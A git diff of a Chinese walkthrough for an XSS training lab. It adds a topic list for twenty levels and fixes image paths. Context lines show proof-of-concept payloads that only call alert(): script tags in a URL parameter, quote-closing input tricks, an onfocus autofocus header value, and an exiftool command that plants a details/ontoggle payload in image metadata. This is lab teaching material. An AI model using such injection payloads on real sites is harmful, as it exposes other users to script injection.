@@ -8,6 +8,22 @@
 
 ---
 
+**知识点**
+- 无过滤 XSS (level 1)
+- 各种难度的构造闭合 XSS (level 2、3、4、5、6)
+- 各种难度的绕过过滤 XSS (level 2、3、4、5、6)
+- 双写拼接 XSS (level 7)
+- 实体编码+HTML 编码 XSS (level 8、9)
+- input 中的 XSS (level 10)
+- HTTP headers 头中的 XSS (level 11、12、13)
+- exif XSS (level 14)
+- angularjs XSS (level 15)
+- URL 编码 XSS (level 16)
+- embed 标签的 XSS (level 17、18)
+- Flash XSS (level 19、20)
+
+---
+
 # level 1
 
 没什么过滤,直接使用 `<script>alert(123)</script>` 即可
@@ -18,7 +34,7 @@ payload: `http://<靶机IP>/level1.php?keyword=test<script>alert(123)</script>`
 
 # level 2
 
-![images](../../../assets/img/安全/实验/XSS/1.png)
+![images](../../../../assets/img/安全/实验/Misc/XSS/1.png)
 
 使用 `">` 构造输入框的闭合
 
@@ -30,7 +46,7 @@ payload: `test"><script>alert(123)</script>`
 
 使用 `'` 可以闭合
 
-![images](../../../assets/img/安全/实验/XSS/2.png)
+![images](../../../../assets/img/安全/实验/Misc/XSS/2.png)
 
 构造 input 的 XSS,例如: `<input value=xss onfocus=alert(1) autofocus>`
 
@@ -51,7 +67,7 @@ $str3=str_replace("<","",$str2);
 
 测试一下 `test"123`
 
-![images](../../../assets/img/安全/实验/XSS/3.png)
+![images](../../../../assets/img/安全/实验/Misc/XSS/3.png)
 
 构造 input 的 XSS,例如: `<input value=xss onfocus=alert(1) autofocus>`
 
@@ -282,7 +298,7 @@ payload: `user=test"onfocus=alert(1) autofocus type="text"`
 
 payload: `exiftool(-k).exe -artist="<details open OntogGle="alert(1)">" 1.jpg`
 
-![images](../../../assets/img/安全/实验/XSS/5.png)
+![images](../../../../assets/img/安全/实验/Misc/XSS/5.png)
 
 ---
 
